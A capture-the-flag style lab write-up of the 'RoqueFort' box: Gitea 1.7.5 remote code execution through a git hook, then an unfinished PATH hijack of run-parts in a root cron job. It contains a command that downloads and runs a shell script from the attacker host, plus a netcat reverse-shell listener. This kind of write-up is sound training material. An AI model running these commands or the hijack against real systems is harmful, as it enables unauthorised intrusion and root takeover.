#Linux #Gitea #RCE #CVE #CronJob #run-parts #PathHijack

## Overview

RoqueFort is a Linux box running Gitea 1.7.5 on port 3000. A public RCE exploit for this version creates a repository with a malicious Git hook, landing a shell as `chloe`. The privilege escalation involves a root cron job that calls `run-parts`, but the notes document the intended technique without confirming completion, so this writeup covers what was attempted.

> **Note:** these notes are incomplete, the foothold and initial user access are fully documented; the privilege escalation technique (placing a binary named `run-parts` in `/usr/local/bin`) is described but the notes end before root was confirmed. Written as in-progress.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5b
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7
2222/tcp open  ssh     Dropbear sshd 2016.74
3000/tcp open  http    Gitea
```

Port 3000 presents the Gitea interface. The version is visible at the bottom of the landing page:

```
Gitea Version: 1.7.5
```

Searching ExploitDB for this version:

**Gitea 1.7.5 - Remote Code Execution**
https://www.exploit-db.com/exploits/49383

> **How Gitea RCE works at this version:** The exploit registers a new user account on the Gitea instance, creates a repository, and then abuses Git hooks (specifically the `post-receive` hook) which execute server-side when a push is received. The hook runs as the Gitea process user. An attacker pushes to the repository, the hook fires, and a reverse shell executes.

## Foothold

### Gitea 1.7.5 RCE

The exploit script requires a pre-created user account matching the credentials hardcoded in the script. An account was registered manually on the Gitea instance before running the exploit:

```
Username: newadmin
Password: admin123
```

The exploit was edited with the correct parameters:

```python
USERNAME = "newadmin"
PASSWORD = "admin123"
HOST_ADDR = '192.168.45.244'
HOST_PORT = 3000
URL = 'http://192.168.180.67:3000'
CMD = 'wget http://192.168.45.244:21/shell.sh && bash shell.sh'
```

After running the exploit, a shell arrives as `chloe` on port 2222:

```sh
rlwrap nc -lvnp 2222
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.67] 37164
whoami
chloe
```

TTY upgrade:

```sh
/usr/bin/script -qc /bin/bash /dev/null
chloe@roquefort:~/gitea-repositories/newadmin/bmxzyvvf.git$
```

Local flag:

```sh
chloe@roquefort:~$ cat local.txt
‹redacted›
```

## Privilege Escalation

### Root Cron Job with run-parts (Attempted)

Examining `/etc/crontab` reveals a root job:

```sh
*/5 * * * *   root    cd / && run-parts --report /etc/cron.hourly
```

> **Why PATH hijacking `run-parts` could work:** `run-parts` is called without an absolute path here, meaning the shell will search `$PATH` for it. If a directory earlier in the PATH (like `/usr/local/bin`) is writable and an attacker places a malicious binary named `run-parts` there, the cron job will execute it as root instead of the real `run-parts`. This is a classic PATH hijacking technique.

A binary named `run-parts` was placed in `/usr/local/bin`. However, the cron triggers `/etc/cron.hourly`, meaning the job fires every 5 minutes but only executes scripts inside `/etc/cron.hourly`, not an arbitrary shell payload, unless the fake `run-parts` itself spawns one. The notes end here without confirming a root shell was received.

## Takeaways

- **Gitea Git hook RCE requires a valid user account.** The exploit itself isn't truly unauthenticated, register first, then run the exploit. The registration step is critical and easy to miss when reading the exploit code.
- **Dropbear SSH on a non-standard port is worth noting.** Port 2222 ran a different SSH daemon (Dropbear 2016) alongside OpenSSH on 22, which may indicate a separate service or restricted access path.
- **PATH hijacking works when cron doesn't use absolute paths.** Any `run-parts`, `backup`, or custom binary called without a full path in a cron script is a potential hijack target if any early-PATH directory is writable.
